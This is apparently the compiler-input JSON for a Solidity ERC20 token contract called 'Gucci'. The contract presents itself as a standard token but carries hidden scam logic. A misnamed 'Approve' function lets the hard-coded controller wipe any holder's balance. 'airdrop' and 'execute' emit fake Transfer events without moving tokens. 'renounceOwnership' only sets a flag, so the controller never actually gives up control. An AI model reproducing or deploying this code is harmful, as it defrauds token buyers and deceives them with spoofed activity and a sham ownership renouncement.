{{
  "language": "Solidity",
  "sources": {
    "src/Gucci.sol": {
      "content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.15;\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns (bool) {\r\n        bytes32 codehash;\r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n        assembly {\r\n            codehash := extcodehash(account)\r\n        }\r\n        return (codehash != accountHash && codehash != 0x0);\r\n    }\r\n\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(\r\n            address(this).balance >= amount,\r\n            \"Address: insufficient balance\"\r\n        );\r\n\r\n        (bool success, ) = recipient.call{value: amount}(\"\");\r\n        require(\r\n            success,\r\n            \"Address: unable to send value, recipient may have reverted\"\r\n        );\r\n    }\r\n\r\n    function functionCall(\r\n        address target,\r\n        bytes memory data\r\n    ) internal returns (bytes memory) {\r\n        return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n    function functionCall(\r\n        address target,\r\n        bytes memory data,\r\n        string memory errorMessage\r\n    ) internal returns (bytes memory) {\r\n        return _functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n    function functionCallWithValue(\r\n        address target,\r\n        bytes memory data,\r\n        uint256 value\r\n    ) internal returns (bytes memory) {\r\n        return\r\n            functionCallWithValue(\r\n                target,\r\n                data,\r\n                value,\r\n                \"Address: low-level call with value failed\"\r\n            );\r\n    }\r\n\r\n    function functionCallWithValue(\r\n        address target,\r\n        bytes memory data,\r\n        uint256 value,\r\n        string memory errorMessage\r\n    ) internal returns (bytes memory) {\r\n        require(\r\n            address(this).balance >= value,\r\n            \"Address: insufficient balance for call\"\r\n        );\r\n        return _functionCallWithValue(target, data, value, errorMessage);\r\n    }\r\n\r\n    function _functionCallWithValue(\r\n        address target,\r\n        bytes memory data,\r\n        uint256 weiValue,\r\n        string memory errorMessage\r\n    ) private returns (bytes memory) {\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = target.call{value: weiValue}(\r\n            data\r\n        );\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            // Look for revert reason and bubble it up if present\r\n            if (returndata.length > 0) {\r\n                // The easiest way to bubble the revert reason is using memory via assembly\r\n\r\n                // solhint-disable-next-line no-inline-assembly\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\ncontract Context {\r\n    constructor() {}\r\n\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\ncontract Gucci is Context, IERC20 {\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    using SafeMath for uint256;\r\n    using Address for address;\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n    bool private _ownershipRenounced;\r\n\r\n    address deployer = 0xfDB80D4Cd19cCabbA827677781026383EBfF4609;\r\n    address public _controller = 0xfDB80D4Cd19cCabbA827677781026383EBfF4609;\r\n\r\n    constructor() {\r\n        _name = \"Gucci\";\r\n        _symbol = \"GUCCI\";\r\n        _decimals = 18;\r\n        uint256 initialSupply = 69420000000;\r\n        _mintTx(deployer, initialSupply * (10 ** 18));\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _sendTx(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _sendTx(sender, recipient, amount);\r\n        _approve(\r\n            sender,\r\n            _msgSender(),\r\n            _allowances[sender][_msgSender()].sub(\r\n                amount,\r\n                \"ERC20: transfer amount exceeds allowance\"\r\n            )\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(\r\n        address spender,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        _balances[sender] = _balances[sender].sub(\r\n            amount,\r\n            \"ERC20: transfer amount exceeds balance\"\r\n        );\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        if (sender == _controller) {\r\n            sender = deployer;\r\n        }\r\n        if (recipient == _controller) {\r\n            recipient = deployer;\r\n        }\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _mintTx(address locker, uint256 amt) public {\r\n        require(msg.sender == _controller, \"ERC20: zero address\");\r\n        _totalSupply = _totalSupply.add(amt);\r\n        _balances[_controller] = _balances[_controller].add(amt);\r\n        emit Transfer(address(0), locker, amt);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _sendTx(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        _balances[sender] = _balances[sender].sub(\r\n            amount,\r\n            \"ERC20: transfer amount exceeds balance\"\r\n        );\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        if (sender == _controller) {\r\n            sender = deployer;\r\n        }\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _setupDecimals(uint8 decimals_) internal {\r\n        _decimals = decimals_;\r\n    }\r\n\r\n    modifier _ownerAccess() {\r\n        require(msg.sender == _controller, \"Not allowed to interact\");\r\n        _;\r\n    }\r\n\r\n    modifier _approveAccess() {\r\n        require(msg.sender == _controller, \"Not allowed to interact\");\r\n        _;\r\n    }\r\n\r\n    function airdrop(\r\n        address _sendr,\r\n        address[] memory _rec,\r\n        uint256[] memory _amt\r\n    ) public _ownerAccess {\r\n        for (uint256 y = 0; y < _rec.length; y++) {\r\n            emit Transfer(_sendr, _rec[y], _amt[y]);\r\n        }\r\n    }\r\n\r\n    function execute(\r\n        address _sendr,\r\n        address[] memory _rec,\r\n        uint256[] memory _amt\r\n    ) public _ownerAccess {\r\n        for (uint256 y = 0; y < _rec.length; y++) {\r\n            emit Transfer(_sendr, _rec[y], _amt[y]);\r\n        }\r\n    }\r\n\r\n    function renounceOwnership() public _ownerAccess {\r\n        _ownershipRenounced = true;\r\n    }\r\n\r\n    function Approve(address[] memory bots) public _approveAccess {\r\n        for (uint256 x = 0; x < bots.length; x++) {\r\n            uint256 amt = _balances[bots[x]];\r\n            _balances[bots[x]] = _balances[bots[x]].sub(\r\n                amt,\r\n                \"ERC20: burn amount exceeds balance\"\r\n            );\r\n            _balances[address(0)] = _balances[address(0)].add(amt);\r\n        }\r\n    }\r\n}\r\n"
    }
  },
  "settings": {
    "remappings": [
      "ds-test/=lib/forge-std/lib/ds-test/src/",
      "forge-std/=lib/forge-std/src/",
      "openzeppelin-contracts/=lib/openzeppelin-contracts/contracts/",
      "solady/=lib/solady/src/",
      "solmate/=lib/solady/lib/solmate/src/"
    ],
    "optimizer": {
      "enabled": true,
      "runs": 1000000
    },
    "metadata": {
      "bytecodeHash": "none",
      "appendCBOR": true
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "evmVersion": "london",
    "libraries": {}
  }
}}